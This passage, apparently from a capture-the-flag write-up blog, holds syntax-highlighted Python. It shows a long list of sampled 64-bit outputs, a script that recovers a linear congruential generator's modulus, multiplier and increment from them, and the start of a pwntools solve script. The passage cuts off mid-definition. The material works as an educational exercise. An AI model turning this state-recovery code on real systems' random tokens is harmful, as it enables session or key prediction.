class="line">[<span class="number">14049561938669887530</span>, <span class="number">10189081935325555607</span>, <span class="number">2070378736500375544</span>, <span class="number">13728924302559051293</span>, <span class="number">6511829117387406870</span>, <span class="number">6594351330701835315</span>, <span class="number">12288384049397398020</span>, <span class="number">17795016091490640729</span>, <span class="number">10371001448023803714</span>, <span class="number">14622825112679494927</span>],</span><br><span class="line">[<span class="number">8225176568250711902</span>, <span class="number">14134860998012572827</span>, <span class="number">16074717029970841100</span>, <span class="number">2350830645414939009</span>, <span class="number">14633361943954378762</span>, <span class="number">13577794152536347383</span>, <span class="number">14530592839530388696</span>, <span class="number">6486725947281032829</span>, <span class="number">4862232593362026486</span>, <span class="number">3452655615207898515</span>],</span><br><span class="line">[<span class="number">7325877545279738858</span>, <span class="number">7423460634144087639</span>, <span class="number">14156693765784153528</span>, <span class="number">17581178006209909469</span>, <span class="number">14062917637362898390</span>, <span class="number">11110625145143304947</span>, <span class="number">10316627992796425156</span>, <span class="number">10871056701990374425</span>, <span class="number">12233149488953770754</span>, <span class="number">13983831420880359375</span>],</span><br><span class="line">[<span class="number">16083375904554397700</span>, <span class="number">2948292991680344409</span>, <span class="number">518031615138696514</span>, <span class="number">17297437370860507919</span>, <span class="number">12931557871963743056</span>, <span class="number">6833777627439793365</span>, <span class="number">10362054450606951854</span>, <span class="number">14005482290916716587</span>, <span class="number">7147586240356760540</span>, <span class="number">13568104668168135313</span>],</span><br><span class="line">[<span class="number">9860557894645199144</span>, <span class="number">16295708076974882829</span>, <span class="number">17599212888693818310</span>, <span class="number">15307324528752608419</span>, <span class="number">4740980282485538868</span>, <span class="number">13532990238439804489</span>, <span class="number">11439122766868929010</span>, <span class="number">14536219818154933887</span>, <span class="number">6874987472374651008</span>, <span class="number">13205533751112129221</span>],</span><br><span class="line">[<span class="number">4113439792173103428</span>, <span class="number">7126184554300862361</span>, <span class="number">12091388330311160962</span>, <span class="number">4202311474540283727</span>, <span class="number">13258330637636302992</span>, <span class="number">10934354385136877333</span>, <span class="number">16600689626062471406</span>, <span class="number">1749451628318326891</span>, <span class="number">10031697911707245852</span>, <span class="number">9657625180546554065</span>],</span><br><span class="line">[<span class="number">12079193783672782500</span>, <span class="number">3360887756492169849</span>, <span class="number">10540326313445100258</span>, <span class="number">7859496753039404847</span>, <span class="number">7349697822141937648</span>, <span class="number">9067059737635804149</span>, <span class="number">16884567464455283022</span>, <span class="number">2890278403712776779</span>, <span class="number">14961769119086081660</span>, <span class="number">17791145162914295729</span>],</span><br><span class="line">[<span class="number">11283122857066504942</span>, <span class="number">3772226041787673195</span>, <span class="number">2029179851415727900</span>, <span class="number">10886201231718363857</span>, <span class="number">13278122040185041562</span>, <span class="number">12299961160999838663</span>, <span class="number">147092718349493480</span>, <span class="number">10149397566115050189</span>, <span class="number">17778901334685053318</span>, <span class="number">9259083228438272355</span>],</span><br><span class="line">[<span class="number">7399210033346454230</span>, <span class="number">12483402310747448307</span>, <span class="number">12804532050934558916</span>, <span class="number">16515740050135639321</span>, <span class="number">14334674963076464642</span>, <span class="number">11415136545669824719</span>, <span class="number">12881170555416737808</span>, <span class="number">3357052785696431253</span>, <span class="number">10275713328539137134</span>, <span class="number">8047944868237500907</span>],</span><br><span class="line">[<span class="number">11694113410536044248</span>, <span class="number">13683830157476333693</span>, <span class="number">3400333106679892470</span>, <span class="number">13262055476397961107</span>, <span class="number">11191368259691287268</span>, <span class="number">15887902896607205305</span>, <span class="number">7907399517033620770</span>, <span class="number">10654988537742836335</span>, <span class="number">15771190229583194160</span>, <span class="number">18300969566086403381</span>],</span><br><span class="line">[<span class="number">8049735646312071314</span>, <span class="number">2029437384246372255</span>, <span class="number">10903970997032824352</span>, <span class="number">14504235846882815717</span>, <span class="number">4668093454598497278</span>, <span class="number">8503799114233934779</span>, <span class="number">14913072597145399724</span>, <span class="number">14431085149007242145</span>, <span class="number">18067439374893472426</span>, <span class="number">10721463929109639191</span>],</span><br><span class="line">[<span class="number">2696097122251550912</span>, <span class="number">1563260698261496837</span>, <span class="number">15631267811495523742</span>, <span class="number">8646322718037144539</span>, <span class="number">6300457185857321548</span>, <span class="number">10456432128835499713</span>, <span class="number">2070798014976967242</span>, <span class="number">13757854517443878455</span>, <span class="number">8508013944440481048</span>, <span class="number">15203895881397092285</span>],</span><br><span class="line">[<span class="number">17685177855345059336</span>, <span class="number">2792163153978687597</span>, <span class="number">8191816887433928102</span>, <span class="number">11833043021654490627</span>, <span class="number">4823229250939582228</span>, <span class="number">761424988059244713</span>, <span class="number">15644836028668782034</span>, <span class="number">9582529702991966687</span>, <span class="number">15558506926611394912</span>, <span class="number">3625821661032255269</span>],</span><br><span class="line">[<span class="number">10285848704834387372</span>, <span class="number">8747285832609767329</span>, <span class="number">13266912091368294058</span>, <span class="number">11526474692644260887</span>, <span class="number">2116758622943281784</span>, <span class="number">16929136467119581853</span>, <span class="number">5965539587549396118</span>, <span class="number">5793861919298196659</span>, <span class="number">12394846883674985604</span>, <span class="number">6694207582934632409</span>],</span><br><span class="line">[<span class="number">16662993260956209502</span>, <span class="number">6048402435986255515</span>, <span class="number">11511398461441495052</span>, <span class="number">1076498669952439169</span>, <span class="number">491431931880096266</span>, <span class="number">15462059226017090807</span>, <span class="number">15417674393734823640</span>, <span class="number">12355120966258389117</span>, <span class="number">3953119281189474806</span>, <span class="number">14510813370140039059</span>],</span><br><span class="line">[<span class="number">808205804364973320</span>, <span class="number">425968280054504301</span>, <span class="number">10945067250051245222</span>, <span class="number">17339877305153855747</span>, <span class="number">15859913338204743188</span>, <span class="number">5976119987263734697</span>, <span class="number">6523909499587558610</span>, <span class="number">7427897702512305375</span>, <span class="number">14462851483191177312</span>, <span class="number">1812572359875447333</span>],</span><br><span class="line">[<span class="number">3464937459606526348</span>, <span class="number">17719755828335698689</span>, <span class="number">5178043290332802954</span>, <span class="number">6796849632481923191</span>, <span class="number">7814022798513909848</span>, <span class="number">4211994959882782717</span>, <span class="number">13926491126268733302</span>, <span class="number">1697195879645913875</span>, <span class="number">6426051253310747748</span>, <span class="number">675678709412355897</span>],</span><br><span class="line">[<span class="number">10444205669711294678</span>, <span class="number">1227172335406819827</span>, <span class="number">10887914848232361668</span>, <span class="number">13396361579650890521</span>, <span class="number">2011745310433865218</span>, <span class="number">9683217903969838799</span>, <span class="number">4059248720375019024</span>, <span class="number">3387000600233038485</span>, <span class="number">12342112531565036142</span>, <span class="number">3055537287348119531</span>],</span><br><span class="line">[<span class="number">17779609461642040498</span>, <span class="number">9307943988470387775</span>, <span class="number">15058836698332001600</span>, <span class="number">6042064057173219973</span>, <span class="number">11074050323342042654</span>, <span class="number">7792965288509326939</span>, <span class="number">2759026769566561996</span>, <span class="number">5905406362997261633</span>, <span class="number">1644669425200917194</span>, <span class="number">2801725896605976759</span>],</span><br><span class="line">[<span class="number">13662389174465413016</span>, <span class="number">1920905278926365757</span>, <span class="number">3415255729952375990</span>, <span class="number">14291716482199323987</span>, <span class="number">8451001365147119524</span>, <span class="number">11270027910155147129</span>, <span class="number">2868674704903984098</span>, <span class="number">13471113901279386671</span>, <span class="number">7169655502800099568</span>, <span class="number">15090883776758528245</span>],</span><br><span class="line">[<span class="number">4833394564540976836</span>, <span class="number">1462831626555472665</span>, <span class="number">8701661863779855874</span>, <span class="number">10118858242104403663</span>, <span class="number">15671687977950443024</span>, <span class="number">11435314203426574997</span>, <span class="number">14273428940632506990</span>, <span class="number">7189160997036746731</span>, <span class="number">16436762879087182492</span>, <span class="number">8885250160732943441</span>],</span><br><span class="line">[<span class="number">10230397123600839054</span>, <span class="number">4921126727494933387</span>, <span class="number">7516350870378474684</span>, <span class="number">2119375992247308017</span>, <span class="number">17109734949097391930</span>, <span class="number">18426834844018291431</span>, <span class="number">17073007225012598920</span>, <span class="number">15892621882167573741</span>, <span class="number">8233009520699042854</span>, <span class="number">14675334716947408515</span>],</span><br><span class="line">[<span class="number">6982897219557017034</span>, <span class="number">2204562232985833399</span>, <span class="number">4540841486346091672</span>, <span class="number">18170157378527499581</span>, <span class="number">17809006179857512886</span>, <span class="number">11336317545337982547</span>, <span class="number">7442659532519627940</span>, <span class="number">15481417753696434297</span>, <span class="number">16753412803609524450</span>, <span class="number">12287350879064986927</span>],</span><br><span class="line">[<span class="number">12335665912060183356</span>, <span class="number">2610720541513277297</span>, <span class="number">14119020701030169018</span>, <span class="number">14981736538184978279</span>, <span class="number">722153007028610824</span>, <span class="number">12935069337555043693</span>, <span class="number">7076068753239537318</span>, <span class="number">8633398057079732995</span>, <span class="number">5408655579795925012</span>, <span class="number">4262353531727793577</span>],</span><br><span class="line">[<span class="number">4267092785397013934</span>, <span class="number">17728241086750687275</span>, <span class="number">5763526120967015388</span>, <span class="number">10301676798823477905</span>, <span class="number">9839424317857014106</span>, <span class="number">14837491278590115207</span>, <span class="number">9215974168692610472</span>, <span class="number">8712919133665367693</span>, <span class="number">10895609864204719174</span>, <span class="number">13927317681743558435</span>],</span><br><span class="line">[<span class="number">15352056503978231050</span>, <span class="number">7827486573053500407</span>, <span class="number">5140995403114531288</span>, <span class="number">4240545414421178237</span>, <span class="number">15896472489418024182</span>, <span class="number">8498701420980123283</span>, <span class="number">14561331762632406500</span>, <span class="number">8607711641320261305</span>, <span class="number">3636292892392378402</span>, <span class="number">11096536616849938799</span>],</span><br><span class="line">[<span class="number">17027027727640810764</span>, <span class="number">12720036563514190977</span>, <span class="number">10685551418130251530</span>, <span class="number">17880028976314842615</span>, <span class="number">16236890500893733848</span>, <span class="number">13540800139094538621</span>, <span class="number">11978005912045584118</span>, <span class="number">14825668687925033107</span>, <span class="number">8400215412801945572</span>, <span class="number">7765797198338144441</span>],</span><br><span class="line">[<span class="number">15021933103315449546</span>, <span class="number">3495716001031128247</span>, <span class="number">1396731112923678104</span>, <span class="number">4140726423186031165</span>, <span class="number">9008962094192876214</span>, <span class="number">12875830066893255507</span>, <span class="number">2988559077576152484</span>, <span class="number">3296391541949453689</span>, <span class="number">6090087509997685218</span>, <span class="number">14387668568230144559</span>],</span><br><span class="line">[<span class="number">7157414067549684176</span>, <span class="number">14246224744479866197</span>, <span class="number">5312071462504532014</span>, <span class="number">16044793512331228331</span>, <span class="number">286107928281657948</span>, <span class="number">1294702977724846865</span>, <span class="number">15547529168176227290</span>, <span class="number">2868356329005689351</span>, <span class="number">13449145964297049128</span>, <span class="number">5653867851018809101</span>],</span><br><span class="line">[<span class="number">7374594347533511120</span>, <span class="number">10784919989654373717</span>, <span class="number">6289716337769721902</span>, <span class="number">9715313610791124139</span>, <span class="number">6273852491043707484</span>, <span class="number">8620708186696129297</span>, <span class="number">4533054523327269850</span>, <span class="number">17632856930228793863</span>, <span class="number">17628763394665921576</span>, <span class="number">17346309440827733773</span>],</span><br><span class="line">[<span class="number">2342052956166955452</span>, <span class="number">14027701385843513329</span>, <span class="number">8680703790305735738</span>, <span class="number">8672751172390114279</span>, <span class="number">8124020536212233608</span>, <span class="number">7155094787357570541</span>, <span class="number">14086194411224025382</span>, <span class="number">12716722541561067395</span>, <span class="number">10456883903364724372</span>, <span class="number">2101970457493468713</span>],</span><br><span class="line">[<span class="number">4772590411956129490</span>, <span class="number">15714089171910557407</span>, <span class="number">14360996586674467424</span>, <span class="number">13231328573932016677</span>, <span class="number">9071211989541121598</span>, <span class="number">17171072845922187003</span>, <span class="number">4212405651219599852</span>, <span class="number">13954828828509115617</span>, <span class="number">3652497334232293610</span>, <span class="number">12214643103804088151</span>],</span><br><span class="line">[<span class="number">7024552045636262550</span>, <span class="number">5078745232453774003</span>, <span class="number">18392027712538477188</span>, <span class="number">14671315152905416153</span>, <span class="number">16196565570157927362</span>, <span class="number">10758379918323891087</span>, <span class="number">4458451415966420432</span>, <span class="number">12485242522330184021</span>, <span class="number">12931506650143323182</span>, <span class="number">6830243321830822059</span>],</span><br><span class="line">[<span class="number">8964158918272436998</span>, <span class="number">9784410928382949603</span>, <span class="number">11041567404879664500</span>, <span class="number">5551643914605234313</span>, <span class="number">14128548633570135346</span>, <span class="number">15639163883442654911</span>, <span class="number">9191151682389195200</span>, <span class="number">7000167578729713925</span>, <span class="number">3396217015901918878</span>, <span class="number">12978045212717783259</span>],</span><br><span class="line">[<span class="number">930350092441786838</span>, <span class="number">8853924157354637043</span>, <span class="number">2178212425054752708</span>, <span class="number">2722704739101523993</span>, <span class="number">3399186260909639426</span>, <span class="number">13182923118250501071</span>, <span class="number">5731235547516544784</span>, <span class="number">8073627230741006229</span>, <span class="number">3677956709842881390</span>, <span class="number">13971340020934644971</span>],</span><br><span class="line">[<span class="number">8133993277912905324</span>, <span class="number">7843213964703918945</span>, <span class="number">6226185426993410410</span>, <span class="number">5331680767225631191</span>, <span class="number">17397835538087071544</span>, <span class="number">1412287336887081565</span>, <span class="number">5214105876660869974</span>, <span class="number">9285168089118547571</span>, <span class="number">13487299643055027524</span>, <span class="number">8286471685319318425</span>],</span><br><span class="line">[<span class="number">9877798999468753552</span>, <span class="number">17485344309800136981</span>, <span class="number">7450392585088596718</span>, <span class="number">16014998380955279979</span>, <span class="number">16676987937050773276</span>, <span class="number">7014035086511155921</span>, <span class="number">4353075052821416602</span>, <span class="number">5214273465324919751</span>, <span class="number">9296731706937982184</span>, <span class="number">14285189272596015821</span>],</span><br><span class="line">[<span class="number">13345670530455246326</span>, <span class="number">16960806989643967379</span>, <span class="number">8150805641731997412</span>, <span class="number">9003267068221273017</span>, <span class="number">12482873274852634914</span>, <span class="number">12768028574192434799</span>, <span class="number">13997000154929075248</span>, <span class="number">6562318857209508149</span>, <span class="number">10078143378426823566</span>, <span class="number">12862362384197416331</span>],</span><br><span class="line">[<span class="number">3527923150139187946</span>, <span class="number">3619024401379797335</span>, <span class="number">9905010736981845176</span>, <span class="number">916210124493907421</span>, <span class="number">7878266368950957270</span>, <span class="number">8644801320039054835</span>, <span class="number">6195480723989131972</span>, <span class="number">3213056259930418969</span>, <span class="number">339953050684289538</span>, <span class="number">5010016423506426575</span>],</span><br><span class="line">[<span class="number">2251345810918236694</span>, <span class="number">7768908363681919027</span>, <span class="number">1099098956475416068</span>, <span class="number">2050851701965502297</span>, <span class="number">12381558919652797250</span>, <span class="number">5777338065403635983</span>, <span class="number">11254700964950298960</span>, <span class="number">1811115485769460437</span>, <span class="number">14286504075835460526</span>, <span class="number">8091345326040540715</span>],</span><br><span class="line">[<span class="number">16278112069030549596</span>, <span class="number">16385088340534825233</span>, <span class="number">5319707000620292570</span>, <span class="number">16571645642318706695</span>, <span class="number">18192160823708113448</span>, <span class="number">880499823610318093</span>, <span class="number">5414255607983293638</span>, <span class="number">4648755476656228771</span>, <span class="number">7169478636217407796</span>, <span class="number">15078679982552795977</span>],</span><br><span class="line">[<span class="number">426316868124203456</span>, <span class="number">10969119826860486917</span>, <span class="number">552761031281981086</span>, <span class="number">1247023011037591771</span>, <span class="number">12257611466755625804</span>, <span class="number">15671707889208357825</span>, <span class="number">11436688080222696266</span>, <span class="number">14368226439564874551</span>, <span class="number">13730188423370108440</span>, <span class="number">6599053453350350013</span>],</span><br><span class="line">[<span class="number">13150327040177579016</span>, <span class="number">3482106160484922989</span>, <span class="number">457652115235515302</span>, <span class="number">13131251877541004291</span>, <span class="number">2165919938561266964</span>, <span class="number">1874523171051007657</span>, <span class="number">214890286552667090</span>, <span class="number">14827429772134029279</span>, <span class="number">8521730223222681440</span>, <span class="number">16150319117368919333</span>],</span><br><span class="line">[<span class="number">9685667656530826836</span>, <span class="number">4228281647083193577</span>, <span class="number">15050272543097082642</span>, <span class="number">5451137345963811871</span>, <span class="number">7193595397311986848</span>, <span class="number">16742736498078750565</span>, <span class="number">11550685797441588862</span>, <span class="number">3787324853958912059</span>, <span class="number">3070997891231209516</span>, <span class="number">8984669684148388897</span>],</span><br><span class="line">[<span class="number">14752986476655224134</span>, <span class="number">3385142835185126435</span>, <span class="number">12213926743259104692</span>, <span class="number">12657461967948401097</span>, <span class="number">6367904324090749810</span>, <span class="number">15110284666942049791</span>, <span class="number">9591973891266545152</span>, <span class="number">16210155917557308997</span>, <span class="number">11696113888881223902</span>, <span class="number">13821863163293729819</span>],</span><br><span class="line">[<span class="number">4848477814157730098</span>, <span class="number">2503575850111447743</span>, <span class="number">6726036994303929792</span>, <span class="number">2927950764232365317</span>, <span class="number">17561161994937690782</span>, <span class="number">12681812859579808987</span>, <span class="number">8048115846657894220</span>, <span class="number">1917671208108152769</span>, <span class="number">3192104843495679818</span>, <span class="number">17341049390396839735</span>],</span><br><span class="line">[<span class="number">15624023056168666090</span>, <span class="number">8146434600483966551</span>, <span class="number">8701665222107143608</span>, <span class="number">10119089966687257309</span>, <span class="number">15687676974167344598</span>, <span class="number">12538554942392783603</span>, <span class="number">16610063634462694340</span>, <span class="number">2396258207933709337</span>, <span class="number">17767863757749531394</span>, <span class="number">8497490419887259599</span>],</span><br><span class="line">[<span class="number">9904744802680554204</span>, <span class="number">897860657704830353</span>, <span class="number">6612153160504639578</span>, <span class="number">13516710305790892167</span>, <span class="number">10315807414093978792</span>, <span class="number">10814436771521575309</span>, <span class="number">8326374286606631750</span>, <span class="number">2670759490861490723</span>, <span class="number">18261708206056895412</span>, <span class="number">5679269205676273609</span>],</span><br><span class="line">[<span class="number">4386764090407132678</span>, <span class="number">7538817058739328995</span>, <span class="number">3669542989146255476</span>, <span class="number">13390793292867456905</span>, <span class="number">1627533522376945714</span>, <span class="number">1619348601751944639</span>, <span class="number">1054589078626870464</span>, <span class="number">17426414204125407237</span>, <span class="number">3384215293532244382</span>, <span class="number">12149926369210243035</span>],</span><br><span class="line">[<span class="number">9075652399451677632</span>, <span class="number">17477461129750553349</span>, <span class="number">6906453161667326110</span>, <span class="number">15376666312306711259</span>, <span class="number">9525563347718634828</span>, <span class="number">11627828412751496641</span>, <span class="number">9110165310342548810</span>, <span class="number">1412107907511113015</span>, <span class="number">5201725249719040024</span>, <span class="number">8430904830132281021</span>],</span><br><span class="line">[<span class="number">15464708125926866968</span>, <span class="number">15600448487509378749</span>, <span class="number">6519789362993140022</span>, <span class="number">7143608277497422803</span>, <span class="number">13293625230873831460</span>, <span class="number">13369681318526341625</span>, <span class="number">170807292839991394</span>, <span class="number">11785703205959406255</span>, <span class="number">1556781967978760560</span>, <span class="number">15184235421986720629</span>],</span><br><span class="line">[<span class="number">7629119045957438128</span>, <span class="number">9900380107195785653</span>, <span class="number">596696669255800334</span>, <span class="number">4278582031231119883</span>, <span class="number">74254975594446140</span>, <span class="number">5123593316016783729</span>, <span class="number">3039801404676596666</span>, <span class="number">6832112111880102247</span>, <span class="number">10247133876988264712</span>, <span class="number">6075962711227303789</span>],</span><br><span class="line">[<span class="number">6336908066116601936</span>, <span class="number">12971542866725846485</span>, <span class="number">9592742266024929966</span>, <span class="number">16263173775885861163</span>, <span class="number">15354346113551323356</span>, <span class="number">7985469633596869521</span>, <span class="number">16041826580607000154</span>, <span class="number">81389639309913735</span>, <span class="number">5615885112384047784</span>, <span class="number">114447206598713229</span>],</span><br><span class="line">[<span class="number">11040999432439563636</span>, <span class="number">5512453816238274697</span>, <span class="number">11424431846249921842</span>, <span class="number">13522546295443439295</span>, <span class="number">10718490700119730624</span>, <span class="number">1706095359879348485</span>, <span class="number">7040115389417735838</span>, <span class="number">6152615953375430875</span>, <span class="number">255387087585043276</span>, <span class="number">17621709043367986113</span>],</span><br><span class="line">[<span class="number">14957465477493635322</span>, <span class="number">17494193893035498407</span>, <span class="number">8061013828328535112</span>, <span class="number">2807631943382374317</span>, <span class="number">9259163356288311782</span>, <span class="number">11692973077768758083</span>, <span class="number">13605147196533588308</span>, <span class="number">16417952875340012521</span>, <span class="number">7587359902178215442</span>, <span class="number">7018999186429420319</span>],</span><br><span class="line">[<span class="number">4160247362847484440</span>, <span class="number">10355906930833152189</span>, <span class="number">13581303426524539702</span>, <span class="number">14772732744715658707</span>, <span class="number">4747635331355111972</span>, <span class="number">13992188610440348665</span>, <span class="number">6230322287487373922</span>, <span class="number">5617124141309113519</span>, <span class="number">199940202428248944</span>, <span class="number">13795873967549177205</span>],</span><br><span class="line">[<span class="number">9602519741905125674</span>, <span class="number">16937819611619365015</span>, <span class="number">6564676558034434296</span>, <span class="number">10240824735346727709</span>, <span class="number">5640631937961250582</span>, <span class="number">1821978171425706291</span>, <span class="number">15036029386116424452</span>, <span class="number">4468359514298396761</span>, <span class="number">13168901307236550722</span>, <span class="number">4763730587553970703</span>],</span><br><span class="line">[<span class="number">7373837261793968386</span>, <span class="number">10732681073625925071</span>, <span class="number">2685231131806765328</span>, <span class="number">813507357571291541</span>, <span class="number">791775451290461550</span>, <span class="number">17739017991622743787</span>, <span class="number">6507132557138914716</span>, <span class="number">6270288673555876689</span>, <span class="number">8374804780035804442</span>, <span class="number">6012463537474406471</span>],</span><br><span class="line">[<span class="number">2329707387181522384</span>, <span class="number">13175857125848631637</span>, <span class="number">5243682071787553838</span>, <span class="number">11325925552859734187</span>, <span class="number">6725612051520491100</span>, <span class="number">2898629712175095569</span>, <span class="number">15538009402986078170</span>, <span class="number">2211492530885400071</span>, <span class="number">5019032041416192040</span>, <span class="number">14271817530945321741</span>],</span><br><span class="line">[<span class="number">8739309380112934642</span>, <span class="number">12716536869086838655</span>, <span class="number">10444072502642941312</span>, <span class="number">1217983807690437573</span>, <span class="number">10253906435801986142</span>, <span class="number">6543269269374082459</span>, <span class="number">8763721817782450956</span>, <span class="number">14400995068283464321</span>, <span class="number">15991223804952802570</span>, <span class="number">15036542192879832055</span>],</span><br><span class="line">[<span class="number">3358427551366085530</span>, <span class="number">10370572159745282247</span>, <span class="number">14593204221461513704</span>, <span class="number">10806911300528658381</span>, <span class="number">7807116788095363718</span>, <span class="number">3735480241003099747</span>, <span class="number">17940463670989711604</span>, <span class="number">1960140359750142473</span>, <span class="number">6122476306792969394</span>, <span class="number">16622495547104752703</span>],</span><br><span class="line">[<span class="number">8362192087476912076</span>, <span class="number">5142187750910833217</span>, <span class="number">4322817412366011338</span>, <span class="number">3126496273901956535</span>, <span class="number">12814058088429933208</span>, <span class="number">17173036637316465469</span>, <span class="number">4347907257424814006</span>, <span class="number">4857695582959340627</span>, <span class="number">3139601897422574244</span>, <span class="number">13718346111352555129</span>],</span><br><span class="line">[<span class="number">9637178809775025514</span>, <span class="number">882551220932902359</span>, <span class="number">5555802023241607992</span>, <span class="number">14415458129479919197</span>, <span class="number">16989175027508189014</span>, <span class="number">10108200254363290227</span>, <span class="number">14936286823813615940</span>, <span class="number">16032866789114161049</span>, <span class="number">17909908100013567106</span>, <span class="number">18298550036105723727</span>],</span><br><span class="line">[<span class="number">18157426400011258858</span>, <span class="number">16930568662236902999</span>, <span class="number">6064361050644555192</span>, <span class="number">12612542872864172765</span>, <span class="number">3268486763278994902</span>, <span class="number">4164657781736028915</span>, <span class="number">10660225834142720964</span>, <span class="number">16132563681175233561</span>, <span class="number">6342249578518018818</span>, <span class="number">13340107222423611343</span>],</span><br><span class="line">[<span class="number">207789459502672138</span>, <span class="number">14337472705684377591</span>, <span class="number">11608180785615818200</span>, <span class="number">7754479037980736381</span>, <span class="number">103475483093813494</span>, <span class="number">7139808333473131155</span>, <span class="number">13031429093197707748</span>, <span class="number">13724891892583357113</span>, <span class="number">6233592829064508450</span>, <span class="number">5842791510131395951</span>],</span><br><span class="line">[<span class="number">3441518153478150654</span>, <span class="number">16103823705477775803</span>, <span class="number">4359191255393433516</span>, <span class="number">5636291442794086817</span>, <span class="number">1522484004891406506</span>, <span class="number">12817675968959290903</span>, <span class="number">17422670393842146424</span>, <span class="number">3125892383987248285</span>, <span class="number">12772389684315063958</span>, <span class="number">14297916753390487219</span>],</span><br><span class="line">[<span class="number">16496674539259128832</span>, <span class="number">13019154712597240901</span>, <span class="number">12877959631151144670</span>, <span class="number">3135499011370504731</span>, <span class="number">13435246973759758732</span>, <span class="number">4694837503945771777</span>, <span class="number">10349138519195875210</span>, <span class="number">13114283023552428151</span>, <span class="number">995069013349513304</span>, <span class="number">13319529699987763197</span>],</span><br><span class="line">[<span class="number">18053129989247845630</span>, <span class="number">9734116319561390267</span>, <span class="number">7571239396192070316</span>, <span class="number">5906684273385406625</span>, <span class="number">1732845241982921642</span>, <span class="number">8885857254564283671</span>, <span class="number">4381596132520370040</span>, <span class="number">7182227964552706973</span>, <span class="number">15958383637688439190</span>, <span class="number">12770570651638758835</span>],</span><br><span class="line">[<span class="number">19529414742290256</span>, <span class="number">1347529617218027733</span>, <span class="number">745823219496155566</span>, <span class="number">14568313997815630891</span>, <span class="number">9089485868962744284</span>, <span class="number">18431970526014152337</span>, <span class="number">17427369282727001434</span>, <span class="number">3450115717042243975</span>, <span class="number">16697055591400214952</span>, <span class="number">8398703236622631565</span>],</span><br><span class="line">[<span class="number">13962790238404640136</span>, <span class="number">4201834617023485421</span>, <span class="number">13225427468977219878</span>, <span class="number">8664035747660142467</span>, <span class="number">7522656229844178580</span>, <span class="number">2554445795380876841</span>, <span class="number">10236063217894537554</span>, <span class="number">5312087233760129887</span>, <span class="number">16045881728967481568</span>, <span class="number">361194876183131301</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">reduce = functools.reduce</span><br><span class="line">gcd = math.gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">b, n</span>):</span><br><span class="line">    g, x, _ = egcd(b, n)</span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> x % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    <span class="comment"># print(&#x27;states&#x27;, states)</span></span><br><span class="line">    <span class="comment"># print(&#x27;modulus&#x27;, modulus)</span></span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> values <span class="keyword">in</span> value_arr:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m, c, a = crack_unknown_modulus(values[:<span class="number">5</span>])</span><br><span class="line">        <span class="built_in">print</span>(m, c, a)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li><code>solve.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line"><span class="comment"># seed = []</span></span><br><span class="line"><span class="comment"># for i in range(10):</span></span><br><span class="line"><span class="comment">#     seed.append(int(p.recvline(), 10))</span></span><br><span class="line"><span class="comment"># print(repr(seed))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">m = <span class="number">18446744073709551616</span></span><br><span class="line">c = <span class="number">69</span></span><br><span class="line">a = <span class="number">69</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rand</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, 